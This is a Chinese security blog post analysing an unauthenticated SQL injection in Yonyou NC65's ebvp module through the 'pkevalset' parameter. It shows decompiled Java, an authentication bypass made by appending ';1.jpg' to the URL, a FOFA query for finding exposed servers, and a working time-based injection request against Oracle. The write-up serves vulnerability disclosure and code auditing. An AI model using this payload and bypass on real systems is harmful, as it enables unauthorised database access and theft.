---
title: "用友NC pkevalset SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-evalschedule-pkevalset-sqli.html
asset_dir: assets/用友nc-pkevalset-sql注入漏洞
---

# 用友NC pkevalset SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/26 08:41
- 1460浏览
- [0评论](#comment)
- 1小时阅读

深入探索

Docker加速服务

技术文章订阅

代码安全审计

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友") NC 是一种商业级的企业资源规划，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。用友NC电子商务平台的 `pkevalset` 参数存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

先看对应的过滤

nc/bs/ebvppub/filter/EbvpRequestFilter.java

```
public void init(FilterConfig arg0) throws ServletException {
    this.listNoNeedLoginUrl.add("/ebvp");
    this.listNoNeedLoginUrl.add("/ebvp/");
    this.listNoNeedLoginUrl.add("/ebvp/index.jsp");
    this.listNoNeedLoginUrl.add("/ebvp/randomid");
    this.listNoNeedLoginUrl.add("/ebvp/lostpwd");
    this.listNoNeedLoginUrl.add("/ebvp/infopub/purannouncenologin");
    this.listNoNeedLoginUrl.add("/ebvp/infopub/purannounceajax");
    this.listNoNeedLoginUrl.add("/ebvp/infopub/showcontent");
    this.listNoNeedLoginUrl.add("/ebvp/infopub/viewpurtrendsnologin");
    this.listNoNeedLoginUrl.add("/ebvp/infopub/viewpurtrendsajax");
    this.listNoNeedLoginUrl.add("/ebvp/infopub/viewlawrulenologin");
    this.listNoNeedLoginUrl.add("/ebvp/infopub/viewlawruleajax");
    this.listNoNeedLoginUrl.add("/ebvp/expeval/login");
    this.listNoNeedLoginUrl.add("/ebvp/expeval/loginsubmit");
    this.listNoNeedLoginUrl.add("/ebvp/sourcingcoll/FileUpload_new.jsp");
    this.listNoNeedLoginUrl.add("/ebvp/pushlet.srv");
    this.listNoNeedLoginPatchUrl.add("/ebvp/login/");
    this.listNoNeedLoginPatchUrl.add("/ebvp/schedulecoll/langtrconller/");
    this.listNoNeedLoginPatchUrl.add("/ebvp/register/");
    this.listNoNeedLoginPatchUrl.add("/ebvp/index/");
    this.listNoNeedLoginPatchUrl.add("/ebvp/ebvpfile/");
    this.staticResourceSuffixes.add(".js");
    this.staticResourceSuffixes.add(".css");
    this.staticResourceSuffixes.add(".json");
    this.staticResourceSuffixes.add(".html");
    this.staticResourceSuffixes.add(".png");
    this.staticResourceSuffixes.add(".gif");
    this.staticResourceSuffixes.add(".jpg");
    this.staticResourceSuffixes.add(".icon");
    this.staticResourceSuffixes.add(".tpl");
}
```

深入探索

文本剥离工具

编码转换工具

编程语言教程

我们只需要 URL 里有这些后缀或者url 就可以绕过权限校验

代码安全审计

根据官方漏洞通告

[![用友NC pkevalset SQL注入漏洞](images/img-001-64c405e33486.webp)](https://image.mrxn.net/ec954ffbb28d4b1abfc25c89d361372a.webp)

直接看 `EvalScheduleController.java` 的业务逻辑处理

漏洞扫描服务

```
package nc.bs.ebvp.expeval;

import java.util.List;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import nc.bs.ebvp.expeval.form.EvalScheFormUtil;
import nc.bs.ebvp.expeval.form.EvalScheduleForm;
import nc.bs.ebvppub.ebvpservicefactory.NCLocatorFactory;
import nc.bs.ebvppub.tools.DefualtPageBarInfo;
import nc.itf.ebvp.expeval.service.IEvalListQueryService;
import nc.itf.ebvp.expeval.service.IEvalScheduleQueryService;
import nc.vo.ebvp.evalset.pojo.AggEvalSetPOJO;
import nc.vo.ebvp.expertbasdoc.pojo.ExpertBasDocPOJO;
import nc.vo.ecpubapp.pattern.data.DefaultPageInfo;
import nc.vo.ecpubapp.pattern.log.Log;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

@Controller
public class EvalScheduleController {

@RequestMapping(value={"/expertschedule"}, method={RequestMethod.GET})
public String expertSchedule(HttpServletRequest request, HttpServletResponse response) {
    String pkEvalSet = request.getParameter("pkevalset");
    ExpertBasDocPOJO expVO = (ExpertBasDocPOJO)request.getSession().getAttribute("EC_EXPERTEVAL_USERVO");
    IEvalScheduleQueryService service = (IEvalScheduleQueryService)NCLocatorFactory.getInstance().getEbvpNCLocator().lookup(IEvalScheduleQueryService.class);
    try {
        AggEvalSetPOJO aggEvalSetVo = service.getEvalSetScheInfoByPk(pkEvalSet);
        EvalScheduleForm scheForm = EvalScheFormUtil.convertVO2Form(aggEvalSetVo, expVO);
        request.setAttribute("EXPERTEVAL_EVALSCHEDULEDETAIL", (Object)scheForm);
    }
    catch (Exception e) {
        Log.getInstance().error((Throwable)e);
        request.setAttribute("EXCEPTION_ERROR", (Object)e);
        return "experteval/error";
    }
    return "experteval/expertschedule";
}
}
```

`pkEvalSet` 带入 `service.getEvalSetScheInfoByPk`

```
public class EvalScheduleQueryServiceImpl
implements IEvalScheduleQueryService {
    public AggEvalSetPOJO getEvalSetScheInfoByPk(String pkEvalSet) throws BusinessException {
        IEvalSetWsQueryService service = (IEvalSetWsQueryService)NCLocator.getInstance().lookup(IEvalSetWsQueryService.class);
        AggEvalSetVO aggVo = service.getEvalSetScheInfoByPk(pkEvalSet);
        AggEvalSetPOJO retVo = (AggEvalSetPOJO)DataVOCopyUtils.ebpurtoebvpAggCopy((Object)aggVo, AggEvalSetPOJO.class);
        return retVo;
    }
```

```
public AggEvalSetVO getEvalSetScheInfoByPk(String pkEvalSet) throws BusinessException {
    Object[] objs = this.queryMDVOByPks(EvalSetVO.class, new String[]{pkEvalSet}, null);
    if (objs == null || objs.length == 0) {
        return null;
    }
```

```
public Object[] queryMDVOByPks(Class parentCls, String[] pks, DefaultTransBizExtContext transContext) throws BusinessException {
    SuperVO parentVO;
    try {
        parentVO = (SuperVO)parentCls.newInstance();
    }
    catch (Exception e) {
        Log.getInstance().error((Throwable)e);
        String message = NCLangResOnserver.getInstance().getStrByID("ec20010_0", "0ec20010-000287");
        throw new BusinessException(message);
    }
    SqlBuilder strWhere = new SqlBuilder();
    strWhere.append(parentVO.getPKFieldName(), pks);
    List list = (List)MDPersistenceService.lookupPersistenceQueryService().queryBillOfVOByCond(parentCls, strWhere.toString(), true, false);
```

[![用友NC pkevalset SQL注入漏洞](images/img-002-730116f51806.webp)](https://image.mrxn.net/25a18ac5757f45aea004c670b8abefe7.webp)

[![用友NC pkevalset SQL注入漏洞](images/img-003-1d5d98a5d602.webp)](https://image.mrxn.net/ec854514d02048a4b5017edadffa00ef.webp)

[![用友NC pkevalset SQL注入漏洞](images/img-004-4e0d51f38ffd.webp)](https://image.mrxn.net/9b65551ae37e453f8e1f4a14746550a8.webp)

最终通过GET请求，将 `pkevalset` 参数值拼接进SQL语句where子语句中调用 executeQuery 直接执行，无任何过滤或校验造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，朴实无华。

网络安全

# 漏洞复现

[![用友NC pkevalset SQL注入漏洞](images/img-005-d23640a13b6f.webp)](https://image.mrxn.net/ce2be8cf627040bb846ada364cdf104f.webp)

漏洞利用示例

编程

```
GET /ebvp/expeval/expertschedule;1.jpg?pkevalset=1'+OR+1111%3d(SELECT+COUNT(*)+FROM+ALL_USERS+T1,ALL_USERS+T2,ALL_USERS+T3,ALL_USERS+T4,ALL_USERS+T5)-- HTTP/1.1
HTTP/1.1
Host: nc65.mrxn.net
```

[![用友NC pkevalset SQL注入漏洞](images/img-006-50b52a821dd7.webp)](https://image.mrxn.net/d2e51f10ca354605a5c7d736e3980435.webp)

# 参考

- `https://security.yonyou.com/#/noticeInfo?id=481`
- `https://www.iufida.com/313-151713-0.html#download`
- `https://mp.weixin.qq.com/s/_Vn1Zkil3umediyv2KKeUw`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
